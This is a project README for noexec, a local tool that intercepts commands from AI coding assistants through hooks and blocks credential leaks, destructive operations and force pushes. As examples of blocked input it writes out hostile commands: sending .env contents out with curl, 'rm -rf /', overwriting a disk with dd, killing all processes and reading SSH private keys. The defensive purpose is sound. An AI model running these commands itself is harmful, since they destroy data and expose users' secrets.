# noexec

**Runtime security for AI coding assistants** - Stop dangerous commands before they execute.

[![CI](https://github.com/emilgelman/noexec/actions/workflows/ci.yml/badge.svg)](https://github.com/emilgelman/noexec/actions/workflows/ci.yml)
[![Security Audit](https://github.com/emilgelman/noexec/actions/workflows/security.yml/badge.svg)](https://github.com/emilgelman/noexec/actions/workflows/security.yml)
[![npm version](https://img.shields.io/npm/v/noexec.svg)](https://www.npmjs.com/package/noexec)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

AI coding assistants like Claude Code, GitHub Copilot, and others can accidentally run dangerous commands:

- 🔑 **Leak credentials** - `echo $AWS_SECRET_KEY`
- 💥 **Destroy data** - `rm -rf /`
- 🚨 **Force push** - `git push --force origin main`
- 📤 **Exfiltrate secrets** - `curl api.example.com -d "$(cat .env)"`

**noexec prevents these issues by analyzing commands before they execute.**

## Installation

```bash
npm install -g noexec
noexec init
```

That's it! noexec now protects your AI coding assistant sessions.

## The Problem

AI coding assistants are incredibly powerful, but they can:

1. **Accidentally expose secrets** when debugging or logging
2. **Run destructive commands** when misunderstanding context
3. **Make risky git operations** without proper safeguards
4. **Send sensitive data** to external services unknowingly

Traditional security tools don't protect against these runtime risks because they occur in your local development environment.

## How noexec Helps

noexec uses **CLI hooks** to intercept commands before execution:

```
AI suggests command → noexec analyzes → Block if dangerous → Safe execution
```

**Built-in protection against:**

- ✅ API keys, tokens, and passwords in commands
- ✅ AWS, GCP, Azure credentials exposure
- ✅ GitHub tokens and SSH keys
- ✅ Environment variable leaks
- ✅ More detectors coming soon

## Quick Start

**1. Install globally:**

```bash
npm install -g noexec
```

**2. Initialize (configures hooks in your AI CLI):**

```bash
noexec init
```

**3. That's it!** Your AI assistant is now protected.

**Supported platforms:**

- ✅ Claude Code (via PreToolUse hook)
- 🔜 GitHub Copilot CLI (coming soon)
- 🔜 Cursor (coming soon)
- 🔜 Continue.dev (coming soon)

## How It Works

noexec integrates with [Claude Code hooks](https://code.claude.com/docs/en/hooks) and similar mechanisms in other AI CLIs:

1. **Hook Registration**: `noexec init` adds a PreToolUse hook to your CLI config
2. **Command Interception**: Before any Bash command runs, the hook calls `noexec analyze`
3. **Security Analysis**: All registered detectors scan the command and parameters
4. **Automatic Blocking**: If a detector finds an issue, the command is blocked (exit code 2)

**Example blocked command:**

```bash
# AI tries to run:
echo "Your AWS key is: $AWS_SECRET_ACCESS_KEY"

# noexec blocks it:
❌ Security issue detected: Credential leak detected
   Detector: credential-leak
   Severity: high
```

## CLI Commands

### `noexec init`

Configures security hooks in supported AI coding assistants.

```bash
noexec init                        # Auto-detect platform
noexec init --platform claude      # Configure specific platform
noexec init --config               # Generate default config file
```

**What it does:**

- Detects supported AI CLIs on your system
- Adds PreToolUse hooks to CLI configuration files
- Validates hook setup
- Optionally generates `noexec.config.json` for customization

### `noexec analyze`

Analyzes commands for security issues (typically called automatically by hooks).

```bash
noexec analyze --hook PreToolUse
noexec analyze --config path/to/config.json
```

**Exit codes:**

- `0` - No issues detected (command allowed)
- `2` - Security issue detected (command blocked)
- `1` - Analysis error

### `noexec validate-config`

Validates a noexec configuration file.

```bash
noexec validate-config                      # Validates ./noexec.config.json
noexec validate-config path/to/config.json  # Validates custom config
```

## Configuration

NoExec supports flexible configuration to customize detector behavior and thresholds. See [CONFIG.md](./CONFIG.md) for full documentation.

**Quick start:**

```bash
noexec init --config  # Generate default config
```

**Example configuration:**

```json
{
  "detectors": {
    "credential-leak": {
      "enabled": true,
      "severity": "high",
      "minEntropy": 4.0,
      "customPatterns": ["mycompany_[a-zA-Z0-9]{32}"]
    },
    "git-force-operations": {
      "enabled": true,
      "protectedBranches": ["main", "master", "production"]
    }
  },
  "globalSettings": {
    "minSeverity": "medium",
    "exitOnDetection": true,
    "jsonOutput": false
  }
}
```

**Config locations** (first found wins):

1. Custom path via `--config` flag
2. Project root: `./noexec.config.json`
3. User home: `~/.noexec/config.json`

For detailed configuration options, see [CONFIG.md](./CONFIG.md).

## Security Detectors

noexec includes built-in detectors for common threats:

### 🔑 Credential Leak Detector

Blocks commands that expose sensitive credentials:

**Detects:**

- AWS credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`)
- GCP service account keys
- Azure connection strings and credentials
- GitHub personal access tokens
- Generic API keys and secrets
- Private key exposure (`-----BEGIN PRIVATE KEY-----`)

**Example blocked commands:**

```bash
echo $AWS_SECRET_ACCESS_KEY
curl -H "Authorization: Bearer ghp_xxxxxxxxxxxx"
cat ~/.ssh/id_rsa
```

### 💥 Destructive Command Detector

Prevents data loss from dangerous operations:

**Detects:**

- `rm -rf` with dangerous paths or wildcards
- Disk operations (`dd`, `mkfs`, `fdisk`)
- Fork bombs and resource exhaustion attacks
- Mass process killers (`kill -9 -1`, `pkill -U`)
- System damage (`wipefs`, `shred`, kernel panics)
- Safe paths allowlist (e.g., `./node_modules`, `./dist`)

**Example blocked commands:**

```bash
rm -rf /
dd if=/dev/zero of=/dev/sda
kill -9 -1
```

### 🔀 Git Force Operation Detector

Protects repositories from destructive git operations:

**Detects:**

- Force push to protected branches (main, master, production, etc.)
- Suggests safer alternatives (`--force-with-lease`)
- Customizable branch protection

**Example blocked commands:**

```bash
git push --force origin main
git push -f origin master
```

### 🌍 Environment Variable Leak Detector

Prevents accidental exposure of sensitive environment variables:

**Detects:**

- Export commands with sensitive variable names
- Common credential patterns (SECRET, TOKEN, KEY, PASSWORD, API)
- Environment variable echoing

**Example blocked commands:**

```bash
export AWS_SECRET_ACCESS_KEY=xxx
echo $DATABASE_PASSWORD
```

### 🔮 Magic String Detector

Identifies hardcoded sensitive data patterns (proof of concept).

**Coming Soon:**

- 🌐 Network exfiltration (`curl | bash`, suspicious endpoints)
- 🗄️ Database operations (`DROP DATABASE`, unsafe `DELETE`)
- 🐳 Docker risks (`--privileged`, mounting sensitive paths)

## Documentation

- **[Architecture](ARCHITECTURE.md)** - Deep dive into noexec's system design, component architecture, and data flow
- **[Detectors](DETECTORS.md)** - Complete reference for all security detectors, patterns, and detection logic
- **[Troubleshooting](TROUBLESHOOTING.md)** - Solutions for common issues, debugging tips, and FAQ

## For Developers

### Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

**Especially welcome:**

- 🔍 New security detectors
- 🔌 Platform integrations (Copilot, Cursor, etc.)
- 🐛 Bug reports and fixes
- 📚 Documentation improvements

### Adding Custom Detectors

Create a detector in `src/detectors/your-detector.ts`:

```typescript
import { Detection } from './index';

export async function detectMyIssue(toolUseData: any): Promise<Detection | null> {
  const toolInput = JSON.stringify(toolUseData);

  // Your detection logic
  if (issueDetected) {
    return {
      severity: 'high', // 'high' | 'medium' | 'low'
      message: 'Clear description of the security issue',
      detector: 'my-detector-name',
    };
  }

  return null;
}
```

Register it in `src/commands/analyze.ts`:

```typescript
import { detectMyIssue } from '../detectors/my-detector';

const detectors: Detector[] = [
  // ... existing detectors
  detectMyIssue,
];
```

### Development Setup

```bash
# Clone the repo
git clone https://github.com/emilgelman/noexec.git
cd noexec

# Install dependencies
npm install

# Build
npm run build

# Link for local testing
npm link

# Run tests
npm test

# Development mode (auto-rebuild)
npm run dev
```

### Testing

```bash
# Run all tests
npm test

# Run tests in watch mode
npm run test:watch

# Run tests with coverage report
npm run test:coverage

# Run tests with UI
npm run test:ui

# Manual testing scripts (legacy)
./scripts/test-simple.sh
```

**Test Coverage:**

- 85+ test cases across all detectors
- Comprehensive edge case testing
- Both positive and negative test scenarios

## Architecture

noexec uses a hook-based security model:

1. **Configuration Phase** (`noexec init`): Registers hooks in platform config files
2. **Runtime Analysis** (`noexec analyze`): Called by hook before command execution
3. **Detection** Pipeline: Runs all detectors sequentially
4. **Blocking**: Exits with code 2 if any detector triggers

**Data flow:**

```
Platform (Claude Code)
  → PreToolUse Hook
  → noexec analyze (stdin: tool data)
  → Detectors
  → Exit Code (0=allow, 2=block)
```

See [CLAUDE.md](CLAUDE.md) for detailed architecture documentation.

## Security

**Privacy-first design:**

- ✅ Runs entirely locally (no network calls)
- ✅ No telemetry or data collection
- ✅ Open source and auditable
- ✅ Fail-open design (errors don't block legitimate work)

Found a vulnerability? See [SECURITY.md](SECURITY.md) for responsible disclosure.

## Roadmap

### ✅ v1.0.0 (Current Release)

- ✅ Destructive command detector
- ✅ Git force push detector
- ✅ Environment variable leak detector
- ✅ Credential leak detector with entropy analysis
- ✅ Magic string detector
- ✅ Automated test suite with 130+ tests
- ✅ Colored CLI output with helpful suggestions
- ✅ Comprehensive documentation
- ✅ CI/CD pipeline with GitHub Actions
- ✅ npm package ready for distribution

### v1.1.0 (Next)

- [ ] Configuration file support (`noexec.config.json`)
- [ ] Custom detector plugins
- [ ] Whitelist/blacklist for specific patterns
- [ ] Per-detector configuration overrides
- [ ] JSON output mode for programmatic use

### v1.2.0

- [ ] GitHub Copilot CLI support
- [ ] Cursor IDE support
- [ ] Continue.dev support
- [ ] VSCode extension
- [ ] Interactive mode for ambiguous detections

### v2.0.0

- [ ] Machine learning-based detectors
- [ ] Centralized policy management for teams
- [ ] Cloud-based threat intelligence (opt-in)
- [ ] Audit logging and reporting
- [ ] Web dashboard for security insights

See [CHANGELOG.md](CHANGELOG.md) for release history.

## FAQ

**Q: Will this slow down my AI assistant?**
A: Minimal impact. Detectors are optimized regex patterns that run in milliseconds.

**Q: What if noexec has a bug and blocks a legitimate command?**
A: You can temporarily disable noexec by removing the hook from your CLI config, or configure a whitelist (coming in v0.3.0).

**Q: Does noexec send my commands to a server?**
A: No. Everything runs locally on your machine. No network calls, no telemetry.

**Q: Can I use this in my company?**
A: Yes! noexec is MIT licensed. Perfect for teams using AI coding assistants.

**Q: How do I add support for my favorite AI CLI?**
A: Check if it supports hooks or pre-execution scripts. If so, open an issue or PR! See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT License - see [LICENSE](LICENSE) file for details.

## Acknowledgments

- Inspired by the [Claude Code hooks system](https://code.claude.com/docs/en/hooks)
- Built for developers who want to safely leverage AI coding assistants
- Thanks to all contributors and the open source community

---

**Star ⭐ this repo if you find it useful!**

Made with ❤️ by [Emil Gelman](https://github.com/emilgelman)
